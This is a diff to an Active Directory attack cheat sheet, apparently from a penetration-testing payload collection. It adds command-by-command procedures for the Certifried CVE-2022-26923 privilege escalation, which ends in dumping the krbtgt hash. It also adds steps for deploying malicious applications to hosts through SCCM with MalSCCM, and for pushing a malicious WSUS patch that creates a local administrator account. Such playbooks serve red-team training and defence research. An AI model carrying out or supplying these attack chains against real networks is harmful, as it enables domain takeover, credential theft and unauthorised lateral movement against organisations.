@@ -81,6 +81,7 @@
       - [ESC6 - EDITF_ATTRIBUTESUBJECTALTNAME2 ](#esc6---editf_attributesubjectaltname2)
       - [ESC7 - Vulnerable Certificate Authority Access Control](#esc7---vulnerable-certificate-authority-access-control)
       - [ESC8 - AD CS Relay Attack](#esc8---ad-cs-relay-attack)
+      - [Certifried CVE-2022-26923](#certifried-cve-2022-26923)
     - [Dangerous Built-in Groups Usage](#dangerous-built-in-groups-usage)
     - [Abusing Active Directory ACLs/ACEs](#abusing-active-directory-aclsaces)
       - [GenericAll](#genericall)
@@ -105,6 +106,8 @@
     - [Kerberos Resource Based Constrained Delegation](#kerberos-resource-based-constrained-delegation)
     - [Kerberos Bronze Bit Attack - CVE-2020-17049](#kerberos-bronze-bit-attack---cve-2020-17049)
     - [PrivExchange attack](#privexchange-attack)
+    - [SCCM Deployment](#sccm-deployment)
+    - [WSUS Deployment](#wsus-deployment)
     - [RODC - Read Only Domain Controller Compromise](#rodc---read-only-domain-controller-compromise)
     - [PXE Boot image attack](#pxe-boot-image-attack)
     - [DSRM Credentials](#dsrm-credentials)
@@ -2109,7 +2112,7 @@ python2 scanMIC.py 'DOMAIN/USERNAME:PASSWORD@TARGET'
 
 - Using any AD account, connect over SMB to a victim Exchange server, and trigger the SpoolService bug. The attacker server will connect back to you over SMB, which can be relayed with a modified version of ntlmrelayx to LDAP. Using the relayed LDAP authentication, grant DCSync privileges to the attacker account. The attacker account can now use DCSync to dump all password hashes in AD
     ```powershell
-    TERM1> python printerbug.py testsegment.local/testuser@s2012exc.testsegment.local <attacker ip/hostname>
+    TERM1> python printerbug.py testsegment.local/username@s2012exc.testsegment.local <attacker ip/hostname>
     TERM2> ntlmrelayx.py --remove-mic --escalate-user ntu -t ldap://s2016dc.testsegment.local -smb2support
     TERM1> secretsdump.py testsegment/ntu@s2016dc.testsegment.local -just-dc
     ```
@@ -2119,7 +2122,7 @@ python2 scanMIC.py 'DOMAIN/USERNAME:PASSWORD@TARGET'
     ```powershell
     # create a new machine account
     TERM1> ntlmrelayx.py -t ldaps://rlt-dc.relaytest.local --remove-mic --delegate-access -smb2support 
-    TERM2> python printerbug.py relaytest.local/testuser@second-dc-server 10.0.2.6
+    TERM2> python printerbug.py relaytest.local/username@second-dc-server 10.0.2.6
     TERM1> getST.py -spn host/second-dc-server.local 'relaytest.local/MACHINE$:PASSWORD' -impersonate DOMAIN_ADMIN_USER_NAME
 
     # connect using the ticket
@@ -2452,6 +2455,46 @@ Require [Impacket PR #1101](https://github.com/SecureAuthCorp/impacket/pull/1101
   ```ps1
   certipy relay -ca 172.16.19.100
   ```
+
+#### Certifried CVE-2022-26923
+
+> An authenticated user could manipulate attributes on computer accounts they own or manage, and acquire a certificate from Active Directory Certificate Services that would allow elevation of privilege.
+
+* Find `ms-DS-MachineAccountQuota`
+  ```ps1
+  python bloodyAD.py -d lab.local -u username -p 'Password123*' --host 10.10.10.10 getObjectAttributes  'DC=lab,DC=local' ms-DS-MachineAccountQuota 
+  ```
+* Add a new computer in the Active Directory, by default `MachineAccountQuota = 10`
+  ```ps1
+  python bloodyAD.py -d lab.local -u username -p 'Password123*' --host 10.10.10.10 addComputer cve 'CVEPassword1234*'
+  certipy account create 'lab.local/username:Password123*@dc.lab.local' -user 'cve' -dns 'dc.lab.local'
+  ```
+* [ALTERNATIVE] If you are `SYSTEM` and the `MachineAccountQuota=0`: Use a ticket for the current machine and reset its SPN
+  ```ps1
+  Rubeus.exe tgtdeleg
+  export KRB5CCNAME=/tmp/ws02.ccache
+  python bloodyAD -d lab.local -u 'ws02$' -k --host dc.lab.local setAttribute 'CN=ws02,CN=Computers,DC=lab,DC=local' servicePrincipalName '[]'
+  ```
+* Set the `dNSHostName` attribute to match the Domain Controller hostname
+  ```ps1
+  python bloodyAD.py -d lab.local -u username -p 'Password123*' --host 10.10.10.10 setAttribute 'CN=cve,CN=Computers,DC=lab,DC=local' dNSHostName '["DC.lab.local"]'
+  python bloodyAD.py -d lab.local -u username -p 'Password123*' --host 10.10.10.10 getObjectAttributes 'CN=cve,CN=Computers,DC=lab,DC=local' dNSHostName
+  ```
+* Request a ticket
+  ```ps1
+  # certipy req 'domain.local/cve$:CVEPassword1234*@ADCS_IP' -template Machine -dc-ip DC_IP -ca discovered-CA
+  certipy req 'lab.local/cve$:CVEPassword1234*@10.100.10.13' -template Machine -dc-ip 10.10.10.10 -ca lab-ADCS-CA
+  ```
+* Either use the pfx or set a RBCD on your machine account to takeover the domain
+  ```ps1
+  certipy auth -pfx ./dc.pfx -dc-ip 10.10.10.10
+
+  openssl pkcs12 -in dc.pfx -out dc.pem -nodes
+  python bloodyAD.py -d lab.local  -c ":dc.pem" -u 'cve$' --host 10.10.10.10 setRbcd 'CVE$' 'CRASHDC$'
+  getST.py -spn LDAP/CRASHDC.lab.local -impersonate Administrator -dc-ip 10.10.10.10 'lab.local/cve$:CVEPassword1234*'   
+  secretsdump.py -user-status -just-dc-ntlm -just-dc-user krbtgt 'lab.local/Administrator@dc.lab.local' -k -no-pass -dc-ip 10.10.10.10 -target-ip 10.10.10.10 
+  ```
+
 
 ### Dangerous Built-in Groups Usage
 
@@ -3238,6 +3281,76 @@ python Exchange2domain.py -ah attackterip -ap listenport -u user -p password -d 
 python Exchange2domain.py -ah attackterip -u user -p password -d domain.com -th DCip --just-dc-user krbtgt MailServerip
 ```
 
+### SCCM Deployment
+
+> SCCM is a solution from Microsoft to enhance administration in a scalable way across an organisation.
+
+* [PowerSCCM - PowerShell module to interact with SCCM deployments](https://github.com/PowerShellMafia/PowerSCCM)
+* [MalSCCM - Abuse local or remote SCCM servers to deploy malicious applications to hosts they manage](https://github.com/nettitude/MalSCCM)
+
+* Compromise client, use locate to find management server 
+    ```ps1
+    MalSCCM.exe locate
+    ```
+* Enumerate over WMI as an administrator of the Distribution Point
+    ```ps1
+    MalSCCM.exe inspect /server:<DistributionPoint Server FQDN> /groups
+    ```
+* Compromise management server, use locate to find primary server
+* use Inspect on primary server to view who you can target
+    ```ps1
+    MalSCCM.exe inspect /all
+    MalSCCM.exe inspect /computers
+    MalSCCM.exe inspect /primaryusers
+    MalSCCM.exe inspect /groups
+    ```
+* Create a new device group for the machines you want to laterally move too
+    ```ps1
+    MalSCCM.exe group /create /groupname:TargetGroup /grouptype:device
+    MalSCCM.exe inspect /groups
+    ```
+
+* Add your targets into the new group 
+    ```ps1
+    MalSCCM.exe group /addhost /groupname:TargetGroup /host:WIN2016-SQL
+    ```
+* Create an application pointing to a malicious EXE on a world readable share : `SCCMContentLib$`
+    ```ps1
+    MalSCCM.exe app /create /name:demoapp /uncpath:"\\BLORE-SCCM\SCCMContentLib$\localthread.exe"
+    MalSCCM.exe inspect /applications
+    ```
+
+* Deploy the application to the target group 
+    ```ps1
+    MalSCCM.exe app /deploy /name:demoapp /groupname:TargetGroup /assignmentname:demodeployment
+    MalSCCM.exe inspect /deployments
+    ```
+* Force the target group to checkin for updates 
+    ```ps1
+    MalSCCM.exe checkin /groupname:TargetGroup
+    ```
+
+* Cleanup the application, deployment and group
+    ```ps1
+    MalSCCM.exe app /cleanup /name:demoapp
+    MalSCCM.exe group /delete /groupname:TargetGroup
+    ```
+
+### WSUS Deployment
+
+> Windows Server Update Services (WSUS) enables information technology administrators to deploy the latest Microsoft product updates. You can use WSUS to fully manage the distribution of updates that are released through Microsoft Update to computers on your network
+
+:warning: The payload must be a Microsoft signed binary and must point to a location on disk for the WSUS server to load that binary.
+
+* [SharpWSUS](https://github.com/nettitude/SharpWSUS)
+
+1. Locate using `HKEY_LOCAL_MACHINE\Software\Policies\Microsoft\Windows\WindowsUpdate` or `SharpWSUS.exe locate`
+2. After WSUS Server compromise: `SharpWSUS.exe inspect`
+3. Create a malicious patch: `SharpWSUS.exe create /payload:"C:\Users\ben\Documents\pk\psexec.exe" /args:"-accepteula -s -d cmd.exe /c \"net user WSUSDemo Password123! /add && net localgroup administrators WSUSDemo /add\"" /title:"WSUSDemo"`
+4. Deploy it on the target: `SharpWSUS.exe approve /updateid:5d667dfd-c8f0-484d-8835-59138ac0e127 /computername:bloredc2.blorebank.local /groupname:"Demo Group"`
+5. Check status deployment: `SharpWSUS.exe check /updateid:5d667dfd-c8f0-484d-8835-59138ac0e127 /computername:bloredc2.blorebank.local`
+6. Clean up: `SharpWSUS.exe delete /updateid:5d667dfd-c8f0-484d-8835-59138ac0e127 /computername:bloredc2.blorebank.local /groupname:”Demo Group`
+
 ### RODC - Read Only Domain Controller Compromise
 
 > If the user is included in the **Allowed RODC Password Replication**, their credentials are stored in the server, and the **msDS-RevealedList** attribute of the RODC is populated with the username.
@@ -3586,3 +3699,6 @@ CME          10.XXX.XXX.XXX:445 HOSTNAME-01   [+] DOMAIN\COMPUTER$ 31d6cfe0d16ae
 * [AD CS: weaponizing the ESC7 attack - Kurosh Dabbagh - 26 January, 2022](https://www.blackarrow.net/adcs-weaponizing-esc7-attack/)
 * [AD CS: from ManageCA to RCE - 11 February, 2022 - Pablo Martínez, Kurosh Dabbagh](https://www.blackarrow.net/ad-cs-from-manageca-to-rce/)
 * [Introducing the Golden GMSA Attack - YUVAL GORDON - March 01, 2022](https://www.semperis.com/blog/golden-gmsa-attack/)
+* [Introducing MalSCCM - Phil Keeble -May 4, 2022](https://labs.nettitude.com/blog/introducing-malsccm/)
+* [Certifried: Active Directory Domain Privilege Escalation (CVE-2022–26923) - Oliver Lyak](https://research.ifcr.dk/certifried-active-directory-domain-privilege-escalation-cve-2022-26923-9e098fe298f4)
+* [bloodyAD and CVE-2022-26923 - soka - 11 May 2022](https://cravaterouge.github.io/ad/privesc/2022/05/11/bloodyad-and-CVE-2022-26923.html)
